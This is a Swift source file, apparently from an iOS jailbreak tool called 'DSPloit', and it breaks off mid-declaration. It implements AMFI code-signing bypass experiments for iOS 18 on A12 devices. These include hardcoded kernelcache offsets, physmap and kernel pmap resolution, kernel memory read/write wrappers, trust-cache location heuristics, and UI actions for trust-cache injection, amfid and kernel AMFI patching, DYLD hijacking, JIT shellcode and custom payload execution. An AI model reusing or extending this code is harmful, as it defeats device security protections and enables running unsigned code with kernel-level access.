//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//
//  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
//

import SwiftUI
import IOSurface

// MARK: - Physmap constants (saved when Exp 74 verifies)

private enum PhysmapConstants {
    private static let gVirtKey = "dsploit.physmap.gVirtBase"
    private static let gPhysKey = "dsploit.physmap.gPhysBase"
    private static let verifiedKey = "dsploit.physmap.verified"

    static let defaultGPhysBase: UInt64 = 0x800000000

    /// From kernelcache.release.iphone11b.decompressed (iOS 18 / A12 fileset, unslid).
    static let unslidTextBase: UInt64 = 0xfffffff007004000
    static let unslidDataBase: UInt64 = 0xfffffff00a0e0000
    static let dataOffsetFromText: UInt64 = 0x30dc000
    static let pplDataOffsetFromData: UInt64 = 0x8000

    static func dataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        kernTextBase &+ dataOffsetFromText
    }

    static func pplDataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        dataSegmentBase(kernTextBase: kernTextBase) &+ pplDataOffsetFromData
    }

    /// `kernel_pmap` global in __DATA (iphone11b kernelcache analyze — adjust per IPSW).
    static let kernelPmapOffsetInData: UInt64 = 0x3525e7

    /// pmap_cs_allow_invalid — ADRP target in kernelcache (iphone11b iOS 18).
    static let pmapCsAllowInvalidOffsetInData: UInt64 = 0x45b8

    /// __DATA slots referenced from AMFI code (analyze_kernelcache.py --trust-cache).
    /// Top slots from `analyze_kernelcache.py --trust-cache` (fast probe only).
    static let trustCacheFastOffsetsInData: [UInt64] = [
        0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770, 0x38e0, 0x45b8,
    ]

    /// DATA globals only — jangan KRW-read simbol fungsi di __TEXT (respring A12).
    static let trustCacheKcacheDataSymbols: [String] = [
        "_trustcache",
    ]

    /// Full list (fallback only, capped at runtime).
    static let trustCacheGlobalOffsetsInData: [UInt64] = [
        0x45b8, 0x3980, 0x2d0, 0x1a4, 0x2770, 0x1f8, 0x48, 0xb4, 0x38e0, 0x68,
        0x24c, 0x2a0, 0x2f8, 0xc8, 0x3920, 0x3930, 0x208, 0x2780, 0x27ad, 0x38,
        0x2828, 0x280e, 0x28, 0x1c8, 0x2838, 0x38c0, 0x38a0, 0x8, 0x1dc, 0x1e8,
        0x1d8, 0x1e4, 0x2860, 0x2788, 0x2798, 0x308, 0x18, 0x2f0, 0x1b8, 0x1e0,
        0x3900, 0x2878, 0x38b0, 0x2898, 0xa0, 0x1310, 0x1320, 0x39b0,
        // High ADRP ref (script lists but skips in pick — still worth probing)
        0xe8, 0x248, 0xf8,
    ]

    /// From kernelcache string table; XPF "base" set may not index these — ChOma names for logging only.
    static let trustCacheXpfSymbols: [String] = [
        "_trustcache",
        "_query_trust_cache",
        "_query_trust_cache_for_rem",
        "_check_cdhash_in_trustcache",
        "_check_trust_cache_runtime_for_uuid",
        "_load_trust_cache",
        "_load_trust_cache_with_type",
        "_pmap_lookup_in_loaded_trust_caches",
        "_pmap_lookup_in_static_trust_cache",
        "trust_cache_init",
        "kernelSymbol.trust_cache",
        "kernelSymbol.query_trust_cache",
    ]

    static func kernelPmapFromGlobal(kernTextBase: UInt64) -> UInt64 {
        let ptr = ds_kreadptr(dataSegmentBase(kernTextBase: kernTextBase) &+ kernelPmapOffsetInData)
        guard ptr != 0, ptr > 0xffffffdc00000000 else { return 0 }
        return ptr
    }

    /// gVirt estimate without reading physmap/DRAM (avoids respring on Exp 74).
    static func gVirtBaseEstimate(ourProc: UInt64) -> (gVirt: UInt64, source: String) {
        if let saved = load() {
            return (saved.gVirtBase, "saved")
        }
        let est = estimateZoneMapBase(ourProc: ourProc)
        if est >= 0xffffffdc00000000 && est < 0xffffffe500000000 {
            return (est & 0xfffffffc00000000, "proc_est (kernelcache)")
        }
        return (0xffffffdcda524000, "kernelcache default (A12)")
    }

    static func save(gVirtBase: UInt64, gPhysBase: UInt64) {
        UserDefaults.standard.set(String(format: "%llx", gVirtBase), forKey: gVirtKey)
        UserDefaults.standard.set(String(format: "%llx", gPhysBase), forKey: gPhysKey)
        UserDefaults.standard.set(true, forKey: verifiedKey)
        clearProbeOK()
    }

    static func load() -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
        guard UserDefaults.standard.bool(forKey: verifiedKey),
              let vStr = UserDefaults.standard.string(forKey: gVirtKey),
              let pStr = UserDefaults.standard.string(forKey: gPhysKey),
              let gVirtBase = UInt64(vStr, radix: 16),
              let gPhysBase = UInt64(pStr, radix: 16) else { return nil }
        return (gVirtBase, gPhysBase)
    }

    static func loadOrDefault() -> (gVirtBase: UInt64, gPhysBase: UInt64) {
        if let saved = load() { return saved }
        let proc = ds_get_our_proc()
        return (estimateZoneMapBase(ourProc: proc), defaultGPhysBase)
    }

    /// Rough zone_map hint from proc (often too high — use scan candidates in Exp 74).
    static func estimateZoneMapBase(ourProc: UInt64) -> UInt64 {
        guard ourProc > 0xffffffd000000000 else { return 0xffffffdcda524000 }
        let block = ourProc & 0xFFFFFFFFF0000000
        return block &- 0x31ADD000
    }

    /// gVirtBase candidates: physmap lives in 0xffffffdc..0xffffffe2, NOT near proc (0xe2+).
    static func gVirtBaseCandidates(ourProc: UInt64, tte: UInt64) -> [(String, UInt64)] {
        var out: [(String, UInt64)] = []
        var seen = Set<UInt64>()

        func add(_ name: String, _ value: UInt64) {
            guard value > 0xffffffdc00000000, seen.insert(value).inserted else { return }
            out.append((name, value))
        }

        if let saved = load()?.gVirtBase { add("saved", saved) }
        add("proc_est", estimateZoneMapBase(ourProc: ourProc))
        add("tte_align_1g", tte & 0xfffffffc00000000)
        add("tte_align_256m", tte & 0xfffffffe00000000)

        var g = UInt64(0xffffffdc00000000)
        while g < 0xffffffe200000000 {
            add("physmap_scan", g)
            g &+= 0x04000000
        }

        return out
    }

    static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }

    private static let probeOKKey = "dsploit.physmap.probeOK"

    static func markProbeOK() {
        UserDefaults.standard.set(true, forKey: probeOKKey)
    }

    static func clearProbeOK() {
        UserDefaults.standard.removeObject(forKey: probeOKKey)
    }

    static var isProbeOK: Bool { UserDefaults.standard.bool(forKey: probeOKKey) }

    static var statusSummary: String {
        if let p = load() {
            return "gVirt=0x\(String(format: "%llx", p.gVirtBase)) gPhys=0x\(String(format: "%llx", p.gPhysBase))"
        }
        return "Jalankan Physmap Verify (Exp 74) dulu"
    }
}

// MARK: - Kernel pmap (for page table walks on kernel VA)

private struct KernelPmapChain {
    let kernProc: UInt64
    let task: UInt64
    let vmMap: UInt64
    let pmap: UInt64
    let tte: UInt64
    let tteField: String
}

/// Kernel/physmap VA (PAC-stripped). iOS 18 pmap may store L1 at +0x00 or +0x08.
private func isKernelOrPhysmapVA(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe500000000 { return true }
    // PAC residue (screenshot: 0xfffffe0… before xpaci)
    if (v >> 40) == 0xfffffe || (v >> 40) == 0xffffff { return true }
    return false
}

private func isReasonablePhysTT(_ v: UInt64) -> Bool {
    v >= 0x800000000 && v < 0x1000000000
}

/// Socket KRW must not touch garbage VAs — caused panic: copy_validate_kernel_addr(0xfffffffbffffffff).
private func isSafePhysmapKRWAddress(_ va: UInt64) -> Bool {
    guard va >= 0xffffffdd00000000 && va < 0xffffffe500000000 else { return false }
    if va >= 0xfffffffa00000000 { return false }
    return true
}

private func physmapVA(fromPhysical phys: UInt64, gVirt: UInt64, gPhys: UInt64, offset: UInt64 = 0) -> UInt64? {
    guard isReasonablePhysTT(phys) else { return nil }
    let va = phys &- gPhys &+ gVirt &+ offset
    guard isSafePhysmapKRWAddress(va) else { return nil }
    return va
}

private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
    guard isSafePhysmapKRWAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

/// Kernel __TEXT / __DATA / fileset aux (0xffffff80… and legacy 0xfffffff0…).
private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    
    // For iOS 15-18, Kernel text/data is always at 0xfffffff0...
    if va >= 0xfffffff000000000 && va < 0xfffffffc00000000 { return true }
    
    // For older iOS versions, kernel text might be at 0xffffff80...
    // But we MUST exclude 0xffffffdc... to 0xffffffe5... (Zone Map / Physmap)
    // because unmapped reads there cause Kernel Data Abort panics.
    // Also exclude 0xffffff8000000000 boundary region (unmapped, causes panic).
    if va >= 0xffffff8000000000 && va < 0xffffffdc00000000 {
        // Skip the very start of kernel VA space — typically unmapped
        if va < 0xffffff8100000000 { return false }
        return true
    }
    
    return false
}

/// kalloc heap (amfid/proc/trust cache — 0xdd/0xde/0xe0…). Jangan pakai aturan physmap 0xdc–0xe6 di sini.
private func isSafeKernelHeapKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    // Zone map on iOS 15-18 is typically 0xffffffdc... to 0xffffffe2...
    // DO NOT allow 0xfffffff0... here because it contains MMIO (I/O registers) which causes LLC Bus Error panic if read!
    // Start from 0xffffffdd to explicitly exclude the VM, Metadata, and Bitmaps regions in 0xffffffdc which can trigger Data Abort panics.
    // End at 0xffffffe5 to explicitly exclude Metadata / Bitmaps regions which start at 0xffffffe7...
    let isZoneMap = va >= 0xffffffdd00000000 && va < 0xffffffe500000000
    guard isZoneMap else { return false }
    if let gVirt = PhysmapConstants.load()?.gVirtBase {
        if va >= gVirt, va < gVirt &+ 0x80000000 { return false }
    }
    return true
}

/// __DATA.__ppl_data — KRW read → "Unexpected fault in kernel static region" (A12 PPL).
private func isInPPLDataRegion(_ va: UInt64, kernTextBase: UInt64) -> Bool {
    let ppl = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernTextBase)
    return va >= ppl && va < ppl + 0x100000
}

/// Trust cache runtime object is heap (kalloc), not static __DATA / __ppl_data.
private func isLikelyTrustCacheHeapPointer(_ v: UInt64, kernTextBase: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(v) else { return false }
    return !isInPPLDataRegion(v, kernTextBase: kernTextBase)
}

/// Antara __TEXT utama dan __DATA (komponen fileset lain: AMFI, trustcache, …).
private func isFilesetAuxDataVA(_ va: UInt64, kernTextBase: UInt64, dataSegBase: UInt64) -> Bool {
    guard va >= kernTextBase, va < dataSegBase else { return false }
    return !isInPPLDataRegion(va, kernTextBase: kernTextBase)
}

/// Exp 77: heap, __DATA pre-PPL, atau fileset aux (pointer dari kc+0x3980 dll.).
private func isSafeTrustCacheStructVA(
    _ va: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    if isInPPLDataRegion(va, kernTextBase: kernTextBase) { return false }
    if isSafeKernelHeapKreadAddress(va) { return true }
    if va >= dataSegBase && va < pplDataBase { return true }
    return isFilesetAuxDataVA(va, kernTextBase: kernTextBase, dataSegBase: dataSegBase)
}

/// Pointer dari slot __DATA — ikuti ke heap / __DATA / fileset aux (bukan alamat fungsi di __TEXT).
private func isSafeTrustCacheFollowPointer(
    _ ptr: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    guard isLikelyKernelObjectPointer(ptr) else { return false }
    return isSafeTrustCacheStructVA(ptr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernTextBase)
}

/// Skip integers / flags (e.g. pmap_cs_allow_invalid = 1 at kc+0x45b8).
private func isLikelyKernelObjectPointer(_ v: UInt64) -> Bool {
    if v < 0x100000 { return false }
    return isLikelyKernelPointer(v)
}

/// iOS 18 trust cache entry layout (24 bytes):
///   [0..19]  CDHash (20 bytes, SHA1 atau truncated SHA256)
///   [20]     hashType: 1=SHA1, 2=SHA256-truncated
///   [21]     flags
///   [22..23] padding
///
/// Heuristik: count harus masuk akal (>= 5), dan setidaknya SATU dari
/// beberapa entry pertama harus punya entropy CDHash yang wajar.
private func trustCacheEntriesPlausible(
    hdrVA: UInt64,
    count: UInt32,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    // count < 5 = false positive (struct lain yang kebetulan lolos ver/count check)
    // count > 200k = tidak masuk akal
    guard count >= 5, count <= 200_000 else { return false }
    let heap = isSafeKernelHeapKreadAddress(hdrVA)
    let r32: (UInt64) -> UInt32 = { heap ? safeKread32Heap($0) : safeKread32Kernel($0) }
    let r64: (UInt64) -> UInt64 = { heap ? safeKread64Heap($0) : safeKread64Kernel($0) }

    // Coba stride 24 dan 32 — iOS 18 pakai salah satu
    for stride: UInt64 in [24, 32] {
        let e0 = hdrVA &+ 8
        guard isSafeTrustCacheStructVA(e0 &+ stride - 1, dataSegBase: dataSegBase,
                                       pplDataBase: pplDataBase, kernTextBase: kernTextBase)
        else { continue }

        // Cek beberapa entry (bukan hanya entry[0]) — entry pertama mungkin metadata
        var entriesWithEntropy = 0
        let checkCount = min(Int(count), 8)

        for i in 0..<checkCount {
            let ef = e0 &+ UInt64(i) * stride
            guard isSafeTrustCacheStructVA(ef &+ 16, dataSegBase: dataSegBase,
                                           pplDataBase: pplDataBase, kernTextBase: kernTextBase)
            else { break }

            let h0 = r64(ef)
            let h1 = r64(ef &+ 8)
            let h2 = r32(ef &+ 16)

            // Semua nol = belum diisi
            if h0 == 0 && h1 == 0 && h2 == 0 { continue }

            // CDHash harus punya entropy: setidaknya beberapa byte non-trivial
            // Longgarkan: cukup 1 dari 3 word punya nilai > 0xFFFF
            let h0entropy = h0 > 0x0000_FFFF
            let h1entropy = h1 > 0x0000_FFFF
            let h2entropy = h2 > 0x00FF
            if h0entropy || h1entropy || h2entropy {
                entriesWithEntropy += 1
            }
        }

        // Minimal 2 entry dari 8 yang dicek harus punya entropy
        // (lebih longgar dari sebelumnya yang butuh 2 dari 3 word per entry)
        if entriesWithEntropy >= 2 {
            return true
        }
    }
    return false
}

private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Kernel(_ va: UInt64) -> UInt32 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKread64Heap(_ va: UInt64) -> UInt64 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Heap(_ va: UInt64) -> UInt32 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKwrite64Physmap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Physmap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Physmap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func safeKwrite64Heap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Heap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Heap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe600000000 { return true }
    return false
}

/// Score pmap candidates (+0x00 tte, +0x08 ttep — Exp 75 checks +0x08 first).
private func pmapCandidateScore(_ pmap: UInt64) -> Int {
    guard isLikelyKernelPointer(pmap) else { return 0 }
    var score = 1
    let p0 = ds_kreadptr(pmap)
    let p8 = ds_kreadptr(pmap + 8)
    if p0 == pmap { score += 1 } // user pmap quirk; L1 may be at +0x08
    else if isKernelOrPhysmapVA(p0) { score += 4 }
    if isKernelOrPhysmapVA(p8) { score += 5 }
    if isReasonablePhysTT(p8) { score += 4 }
    if isReasonablePhysTT(p0) { score += 3 }
    return score
}

/// Wide scan vm_map + task for pmap (kernel vm_map often ≠ +0x50 only).
private func findPmapPointer(vmMap: UInt64, task: UInt64, detail: inout String) -> UInt64? {
    var best: (addr: UInt64, score: Int, label: String)?

    func consider(_ addr: UInt64, _ label: String) {
        let sc = pmapCandidateScore(addr)
        guard sc >= 3 else { return }
        if best == nil || sc > best!.score {
            best = (addr, sc, label)
        }
    }

    if vmMap != 0 {
        detail += "Scanning vm_map 0x\(String(format: "%llx", vmMap)) for pmap...\n"
        for off in stride(from: UInt64(0), to: 0xC0, by: 8) {
            let p = ds_kreadptr(vmMap + off)
            if isLikelyKernelPointer(p) {
                let sc = pmapCandidateScore(p)
                if sc >= 3 {
                    detail += "  map+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                    consider(p, "vm_map+0x\(String(format: "%x", off))")
                }
            }
        }
    }

    detail += "Scanning task 0x\(String(format: "%llx", task)) for pmap...\n"
    for off in stride(from: UInt64(0x20), to: 0x98, by: 8) {
        let p = ds_kreadptr(task + off)
        if isLikelyKernelPointer(p) {
            let sc = pmapCandidateScore(p)
            if sc >= 4 {
                detail += "  task+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                consider(p, "task+0x\(String(format: "%x", off))")
            }
        }
    }

    if let b = best {
        detail += "✅ pmap from \(b.label): 0x\(String(format: "%llx", b.addr)) (score \(b.score))\n\n"
        return b.addr
    }

    if vmMap != 0 {
        detail += "vm_map dump (pmap not found):\n"
        for off in stride(from: UInt64(0), to: 0x60, by: 8) {
            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", ds_kread64_safe(vmMap + off)))\n"
        }
        detail += "\n"
    }
    return nil
}

/// L1 page table root from pmap (+0x00 tte VA, +0x08 ttep/alt, PAC via ds_kreadptr).
private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt64, field: String)? {
    detail += "pmap struct dump (ds_kreadptr = PAC stripped):\n"
    var best: (UInt64, String)?
    for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
        let raw = ds_kread64_safe(pmap + off)
        let ptr = ds_kreadptr(pmap + off)
        let tag: String
        if isKernelOrPhysmapVA(ptr) { tag = " ← L1 VA?" }
        else if isReasonablePhysTT(ptr) { tag = " ← phys?" }
        else { tag = "" }
        detail += "  +0x\(String(format: "%02x", off)): raw=0x\(String(format: "%016llx", raw)) ptr=0x\(String(format: "%016llx", ptr))\(tag)\n"
    }
    detail += "\n"

    // +0x08 first — iOS 18 / Exp 75 often has TTBR at pmap+0x08
    for (off, name) in [(UInt64(8), "+0x08 ttep/alt"), (UInt64(0), "+0x00 tte"), (UInt64(0x10), "+0x10")] {
        let v = ds_kreadptr(pmap + off)
        if v == pmap { continue }
        if isKernelOrPhysmapVA(v) {
            detail += "✅ L1 root from \(name): 0x\(String(format: "%llx", v))\n"
            return (v, name)
        }
    }
    for (off, name) in [(UInt64(8), "+0x08"), (UInt64(0), "+0x00")] {
        let v = ds_kreadptr(pmap + off)
        if isReasonablePhysTT(v) {
            detail += "⚠️ Physical L1 at \(name): 0x\(String(format: "%llx", v)) (need gVirtBase to map)\n"
            if best == nil { best = (v, "\(name) phys") }
        }
    }
    if let b = best { return (b.0, b.1) }
    detail += "❌ No valid L1 at pmap+0x00/+0x08 (user pmap often has tte=0 — try kernproc pmap)\n"
    return nil
}

/// Exp 74 verify — NO brute-force physmap KRW scan (caused panic at 0xfffffffbffffffff).
@discardableResult
private func verifyPhysmapSafe(
    kernBase: UInt64,
    kernMagic: UInt64,
    ourProc: UInt64,
    tte: UInt64,
    detail: inout String
) -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
    let gPhysBase = PhysmapConstants.defaultGPhysBase

    detail += "=== Physmap verify (minimal KRW — no zone/DRAM read) ===\n"
    detail += "Menghindari respring: tidak baca physmap/DRAM/pmap (hanya __TEXT + estimasi).\n\n"

    guard (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF else {
        detail += "❌ KRW tidak bisa baca kernel __TEXT (Mach-O)\n"
        return nil
    }
    detail += "✅ KRW reads kernel __TEXT at 0x\(String(format: "%llx", kernBase))\n"

    var (gVirt, source) = PhysmapConstants.gVirtBaseEstimate(ourProc: ourProc)

    if tte != 0, isKernelOrPhysmapVA(tte), source != "saved" {
        let aligned = tte & 0xfffffffc00000000
        if aligned >= 0xffffffdc00000000 && aligned < 0xffffffe500000000 {
            let ttep = tte &- aligned &+ gPhysBase
            if ttep >= 0x800000000 && ttep < 0x900000000 {
                gVirt = aligned
                source = "tte_align (offline hint)"
            }
        }
    }

    detail += "gVirtBase: 0x\(String(format: "%llx", gVirt)) (\(source))\n"
    detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
    detail += "(DRAM/physmap KRW probe disabled — caused respring on some boots)\n"

    detail += "\n🎉 PHYSMAP CONSTANTS SET\n"
    detail += "physmap_slide = 0x\(String(format: "%llx", gVirt &- gPhysBase))\n"
    detail += "→ Lanjut ② Trust Cache Probe\n\n"
    PhysmapConstants.save(gVirtBase: gVirt, gPhysBase: gPhysBase)
    return (gVirt, gPhysBase)
}

/// Page table root for kernel virtual addresses — must use kernproc, not our_proc.
private func resolveKernelPmapChain(detail: inout String) -> KernelPmapChain? {
    let kernProc = ds_get_kern_proc()
    guard kernProc != 0 else {
        detail += "❌ ds_get_kern_proc() failed (check offsets / kernproc symbol)\n"
        return nil
    }
    detail += "kernproc: 0x\(String(format: "%llx", kernProc))\n"

    let task = taskbyproc(kernProc)
    guard task != 0 else {
        detail += "❌ taskbyproc(kernproc) failed\n"
        return nil
    }
    detail += "kernel task: 0x\(String(format: "%llx", task))\n"

    var vmMap = task_get_vm_map(task)
    if vmMap == 0 {
        for off: UInt64 in [0x28, 0x30, 0x20, 0x38, 0x40] {
            let c = ds_kread64_safe(task + off)
            if c > 0xffffffdc00000000 && c < 0xffffffe500000000 {
                let fwd = ds_kread64_safe(c + 0x10)
                if fwd != 0 {
                    vmMap = c
                    detail += "kernel vm_map (scan +0x\(String(format: "%x", off))): 0x\(String(format: "%llx", c))\n"
                    break
                }
            }
        }
    } else {
        detail += "kernel vm_map (off_task_map): 0x\(String(format: "%llx", vmMap))\n"
    }

    var pmap: UInt64 = 0
    let kernBase = ds_get_kernel_base()
    let globalPmap = PhysmapConstants.kernelPmapFromGlobal(kernTextBase: kernBase)
    if globalPmap != 0 {
        pmap = globalPmap
        detail += "kernel_pmap (kernelcache __DATA+0x\(String(format: "%x", PhysmapConstants.kernelPmapOffsetInData))): 0x\(String(format: "%llx", pmap))\n"
    }

    if pmap == 0 {
        guard vmMap != 0 else {
            detail += "❌ kernel vm_map not found\n"
            return nil
        }
        guard let found = findPmapPointer(vmMap: vmMap, task: task, detail: &detail) else {
            detail += "❌ kernel pmap not found (wide scan vm_map+task)\n"
            return nil
        }
        pmap = found
    }

    guard let l1 = resolvePmapL1Root(pmap: pmap, detail: &detail) else {
        return nil
    }

    var l1VA = l1.va
    var field = l1.field
    if !isKernelOrPhysmapVA(l1VA), isReasonablePhysTT(l1VA), let saved = PhysmapConstants.load() {
        l1VA = l1VA &- saved.gPhysBase &+ saved.gVirtBase
        field = "\(l1.field) → physmap VA"
        detail += "Converted phys L1 → physmap VA: 0x\(String(format: "%llx", l1VA))\n"
    }

    guard isKernelOrPhysmapVA(l1VA) else {
        detail += "❌ kernel L1 not usable (tte=0 at +0x00 — run Exp 74 brute scan first)\n"
        return nil
    }
    detail += "kernel L1 (\(field)): 0x\(String(format: "%llx", l1VA))\n\n"

    return KernelPmapChain(kernProc: kernProc, task: task, vmMap: vmMap, pmap: pmap, tte: l1VA, tteField: field)
}

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var runningLabel = ""
    @State private var customBinary = "/usr/bin/id"
    // Exp 79: simpan hasil probe untuk dipakai inject
    @State private var probedTCAddr: UInt64 = 0
    @State private var probedTCCount: UInt32 = 0
    @State private var probedTCStride: UInt32 = 24

    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Status Banner
            if isRunning {
                Section {
                    HStack(spacing: 10) {
                        ProgressView()
                            .tint(.red)
                        VStack(alignment: .leading, spacing: 2) {
                            Text("Running: \(runningLabel)")
                                .font(.caption.bold())
                                .foregroundStyle(.red)
                            Text("Do NOT close app — will cause panic!")
                                .font(.system(size: 9))
                                .foregroundStyle(.orange)
                        }
                    }
                    .padding(.vertical, 4)
                }
            }
            
            // Jailbreak path (sequential — after Exp 74 success)
            Section {
                Text(PhysmapConstants.statusSummary)
                    .font(.system(size: 10, design: .monospaced))
                    .foregroundStyle(PhysmapConstants.isVerified ? .green : .orange)

                pathButton(
                    title: "① Physmap Verify (Exp 74)",
                    icon: "map.fill",
                    color: .cyan,
                    label: "Physmap",
                    action: runExp74,
                    needsVerified: false
                )

                pathButton(
                    title: "② Trust Cache Probe (Exp 77 read-only)",
                    icon: "magnifyingglass.circle.fill",
                    color: .mint,
                    label: "TC Probe",
                    action: runExp77Probe,
                    needsVerified: true
                )

                pathButton(
                    title: "③ KTRR Analysis (Exp 79 — info only)",
                    icon: "lock.shield.fill",
                    color: .yellow,
                    label: "KTRR",
                    action: runExp79WriteTest,
                    needsVerified: true,
                    needsProbe: true
                )

                pathButton(
                    title: "③b RC Trust Cache Add (Exp 80)",
                    icon: "key.fill",
                    color: .orange,
                    label: "RC TC Add",
                    action: runExp80RCTrustCacheAdd,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③c Heap TC Analysis (Exp 81)",
                    icon: "doc.text.magnifyingglass",
                    color: .pink,
                    label: "Heap TC",
                    action: runExp81HeapTCAnalysis,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③d Deep TC Scan (Exp 82)",
                    icon: "memorychip",
                    color: .cyan,
                    label: "Deep TC",
                    action: runExp82DeepTCScan,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③e CS Flags Bypass (Exp 83)",
                    icon: "shield.lefthalf.filled",
                    color: .purple,
                    label: "CS Flags",
                    action: runExp83CSFlagsBypass,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③f amfid Patch (Exp 84)",
                    icon: "waveform.badge.exclamationmark",
                    color: .red,
                    label: "amfid",
                    action: runExp84AmfidPatch,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③g Kernel AMFI Patch (Exp 85)",
                    icon: "bolt.trianglebadge.exclamationmark",
                    color: .red,
                    label: "Kern AMFI",
                    action: runExp85KernelAmfiPatch,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③h Ad-hoc Sign + Spawn (Exp 86)",
                    icon: "signature",
                    color: .yellow,
                    label: "AdHoc",
                    action: runExp86AdHocSpawn,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③i DYLD Hijack (Exp 87)",
                    icon: "link.badge.plus",
                    color: .yellow,
                    label: "DYLD Hijack",
                    action: runExp87DyldHijack,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③j SB dlopen (Exp 88)",
                    icon: "app.badge",
                    color: .green,
                    label: "SB dlopen",
                    action: runExp88SBDlopen,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③k JIT Shellcode (Exp 89)",
                    icon: "memorychip.fill",
                    color: .green,
                    label: "JIT",
                    action: runExp89JIT,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③l SB system() (Exp 90)",
                    icon: "terminal",
                    color: .green,
                    label: "SB system",
                    action: runExp90SBSystem,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③m Fork+Exec (Exp 91)",
                    icon: "arrow.triangle.branch",
                    color: .green,
                    label: "Fork+Exec",
                    action: runExp91ForkExec,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③n TC Inject (Exp 92)",
                    icon: "plus.circle.fill",
                    color: .green,
                    label: "TC Inject",
                    action: runExp92TCInject,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o AMFI Data Write (Exp 93)",
                    icon: "shield.slash",
                    color: .red,
                    label: "AMFI Data",
                    action: runExp93AMFIDataWrite,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o2 AMFI Flag Disable (Exp 93b)",
                    icon: "shield.slash.fill",
                    color: .red,
                    label: "AMFI Disable",
                    action: runExp93bAMFIFlagDisable,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o3 AMFI Verified Spawn (Exp 93c)",
                    icon: "checkmark.shield.fill",
                    color: .red,
                    label: "AMFI Verify",
                    action: runExp93cVerifiedSpawn,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o4 Custom Payload (Exp 93d)",
                    icon: "hammer.fill",
                    color: .red,
                    label: "Custom Exec",
                    action: runExp93dCustomPayload,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③o5 File Payload (Exp 93e)",
                    icon: "doc.badge.gearshape",
                    color: .red,
